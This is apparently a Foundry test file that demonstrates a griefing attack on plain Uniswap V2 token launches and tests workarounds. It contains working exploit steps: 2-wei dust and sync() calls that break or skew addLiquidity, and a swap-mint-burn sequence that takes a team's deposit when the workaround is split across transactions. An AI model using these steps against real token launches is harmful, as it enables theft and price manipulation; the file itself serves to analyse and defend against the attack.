// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseV2Test} from "../utils/BaseV2Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {ManualV2Launch} from "../mocks/ManualV2Launch.sol";
import {ITestPair} from "../utils/UniswapV2.sol";

/**
 * @notice Shows the attack on a plain Uniswap V2 launch and why fixing it through the router does not work.
 */
contract AttackV2Test is BaseV2Test {
    function setUp() public override {
        super.setUp();
        vm.startPrank(team);
        newToken.approve(address(router), type(uint256).max);
        wbnb.approve(address(router), type(uint256).max);
        vm.stopPrank();
    }

    /**
     * @notice Baseline: without the attack `addLiquidity` creates the pair and sets the target price.
     */
    function test_NormalLaunchWithoutAttack() public {
        vm.prank(team);
        router.addLiquidity(
            address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, AMOUNT_NEW, AMOUNT_WBNB, team, block.timestamp
        );

        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pairOf());
        assertEq(reserveNew, AMOUNT_NEW);
        assertEq(reserveWbnb, AMOUNT_WBNB);
    }

    /**
     * @notice 2 wei of WBNB and `sync()` make every `addLiquidity` call revert.
     */
    function test_AttackBreaksNormalLaunch() public {
        ITestPair pair = attack(2);

        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        assertEq(reserveNew, 0);
        assertEq(reserveWbnb, 2);

        // The router sees non-zero reserves and calls `quote()`, which requires both reserves to be non-zero.
        vm.prank(team);
        vm.expectRevert(bytes("UniswapV2Library: INSUFFICIENT_LIQUIDITY"));
        router.addLiquidity(address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, 0, 0, team, block.timestamp);
    }

    /**
     * @notice If the attacker has a little NEW, dust on both sides makes the router use the attacker's price.
     */
    function test_DustOnBothSidesForcesAttackerPrice() public {
        vm.prank(team);
        newToken.transfer(attacker, 1);

        vm.startPrank(attacker);
        ITestPair pair = ITestPair(factory.createPair(address(newToken), address(wbnb)));
        newToken.transfer(address(pair), 1);
        wbnb.transfer(address(pair), 1);
        pair.sync();
        vm.stopPrank();

        vm.prank(team);
        (uint256 usedNew, uint256 usedWbnb,) =
            router.addLiquidity(address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, 0, 0, team, block.timestamp);

        // The router keeps the 1:1 ratio: 1 NEW = 1 WBNB instead of 0.37.
        assertEq(usedNew, AMOUNT_WBNB);
        assertEq(usedWbnb, AMOUNT_WBNB);
    }

    /**
     * @notice Topping up the dust and calling the router does not give the target price: the router fits the whole
     *         deposit to the ratio of the dust, and the dust ratio can only be set in whole wei.
     */
    function test_RouterCopiesRoundedDustRatio() public {
        ITestPair pair = attack(2);

        // The exact top-up is 2 * 1000 / 370 = 5.4 wei of NEW. Only whole wei are possible, so the team sends 6.
        vm.startPrank(team);
        newToken.transfer(address(pair), 6);
        pair.sync();
        (uint256 usedNew, uint256 usedWbnb,) =
            router.addLiquidity(address(newToken), address(wbnb), AMOUNT_NEW, AMOUNT_WBNB, 0, 0, team, block.timestamp);
        vm.stopPrank();

        // The router takes WBNB at the 6:2 ratio of the dust: 333.3 WBNB instead of 370.
        assertEq(usedNew, AMOUNT_NEW);
        assertEq(usedWbnb, AMOUNT_NEW * 2 / 6);

        // The launch price is 1 NEW = 0.333 WBNB instead of 0.37, about 10% lower.
        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        assertApproxEqRel(reserveWbnb * 1e18 / reserveNew, 0.3333e18, 0.001e18);
    }

    /**
     * @notice If the dust is fixed in one transaction and liquidity is added in another, the attacker can move the
     *         price of the dust pool again for almost nothing.
     */
    function test_FixInSeparateTransactionIsGriefedAgain() public {
        ITestPair pair = attack(2);

        // Transaction 1: the team tops up the dust and calls `sync()`. Reserves are (6 NEW, 2 WBNB).
        vm.startPrank(team);
        newToken.transfer(address(pair), 6);
        pair.sync();
        vm.stopPrank();

        // Between the transactions: the attacker swaps 1000 wei of WBNB for 5 wei of NEW.
        vm.startPrank(attacker);
        wbnb.transfer(address(pair), 1000);
        (uint256 amount0Out, uint256 amount1Out) = pair.token0() == address(newToken) ? (5, 0) : (0, 5);
        pair.swap(amount0Out, amount1Out, attacker, "");
        vm.stopPrank();

        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        assertEq(reserveNew, 1);
        assertEq(reserveWbnb, 1002);

        // Transaction 2: `addLiquidity` with 1% slippage reverts. Without the limits it would add at the wrong price.
        vm.prank(team);
        vm.expectRevert(bytes("UniswapV2Router: INSUFFICIENT_A_AMOUNT"));
        router.addLiquidity(
            address(newToken),
            address(wbnb),
            AMOUNT_NEW,
            AMOUNT_WBNB,
            AMOUNT_NEW * 99 / 100,
            AMOUNT_WBNB * 99 / 100,
            team,
            block.timestamp
        );
    }

    /**
     * @notice The correct manual workaround: in one transaction, send large amounts of both tokens to the pair at the
     *         target ratio, call `sync()` and add the rest through the router. The 2 wei of dust are now tiny next to
     *         the reserves, so the price is exact up to rounding, and the team owns all the liquidity.
     */
    function test_FullAmountsInOneTransactionGiveExactPrice() public {
        ITestPair pair = attack(2);
        ManualV2Launch manual = new ManualV2Launch();

        vm.startPrank(team);
        newToken.approve(address(manual), AMOUNT_NEW);
        wbnb.approve(address(manual), AMOUNT_WBNB);
        uint256 teamNewBefore = newToken.balanceOf(team);
        uint256 teamWbnbBefore = wbnb.balanceOf(team);
        // Half of the deposit goes in through sync(), the other half through the router.
        manual.launch(
            router,
            pair,
            IERC20(address(newToken)),
            IERC20(address(wbnb)),
            AMOUNT_NEW / 2,
            AMOUNT_WBNB / 2,
            AMOUNT_NEW / 2,
            AMOUNT_WBNB / 2
        );
        vm.stopPrank();

        // The price is 0.37 WBNB per NEW up to rounding of 1e-15.
        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        assertApproxEqRel(reserveWbnb * 1e18 / reserveNew, 0.37e18, 1e3);

        // The team holds every LP token except MINIMUM_LIQUIDITY, so the tokens sent through sync() are its own:
        // burning the LP tokens returns the whole deposit, minus a few wei.
        uint256 liquidity = pair.balanceOf(team);
        assertEq(liquidity, pair.totalSupply() - 1000);
        vm.startPrank(team);
        pair.transfer(address(pair), liquidity);
        pair.burn(team);
        vm.stopPrank();
        assertApproxEqAbs(newToken.balanceOf(team), teamNewBefore, 1e6);
        assertApproxEqAbs(wbnb.balanceOf(team), teamWbnbBefore, 1e6);
    }

    /**
     * @notice The same workaround split across transactions loses the tokens. After `sync()` the pair has reserves but
     *         no LP tokens, so whoever mints first owns everything in it. The attacker buys a little NEW from the pair,
     *         mints, burns and takes the team's tokens.
     */
    function test_FullAmountsSplitAcrossTransactionsAreStolen() public {
        ITestPair pair = attack(2);

        // Transaction 1: the team sends half of the deposit to the pair and calls sync().
        vm.startPrank(team);
        newToken.transfer(address(pair), AMOUNT_NEW / 2);
        wbnb.transfer(address(pair), AMOUNT_WBNB / 2);
        pair.sync();
        vm.stopPrank();

        uint256 attackerNewBefore = newToken.balanceOf(attacker);
        uint256 attackerWbnbBefore = wbnb.balanceOf(attacker);
        vm.startPrank(attacker);
        // Buy some NEW from the pair: 0.01 WBNB in, the output follows the 0.3% fee formula of the pair.
        uint256 amountIn = 0.01e18;
        (uint256 reserveNew, uint256 reserveWbnb) = reserves(pair);
        uint256 newOut = amountIn * 997 * reserveNew / (reserveWbnb * 1000 + amountIn * 997);
        wbnb.transfer(address(pair), amountIn);
        (uint256 amount0Out, uint256 amount1Out) =
            pair.token0() == address(newToken) ? (newOut, uint256(0)) : (uint256(0), newOut);
        pair.swap(amount0Out, amount1Out, attacker, "");

        // Mint with a tiny deposit: with no LP tokens yet, the attacker gets all of them except MINIMUM_LIQUIDITY.
        newToken.transfer(address(pair), newOut);
        wbnb.transfer(address(pair), amountIn);
        uint256 liquidity = pair.mint(attacker);
        assertEq(liquidity, pair.totalSupply() - 1000);

        // Burn and take almost everything the team sent.
        pair.transfer(address(pair), liquidity);
        pair.burn(attacker);
        vm.stopPrank();

        assertGt(newToken.balanceOf(attacker) - attackerNewBefore, AMOUNT_NEW / 2 * 99 / 100);
        assertGt(wbnb.balanceOf(attacker) + 2 * amountIn - attackerWbnbBefore, AMOUNT_WBNB / 2 * 99 / 100);
    }
}
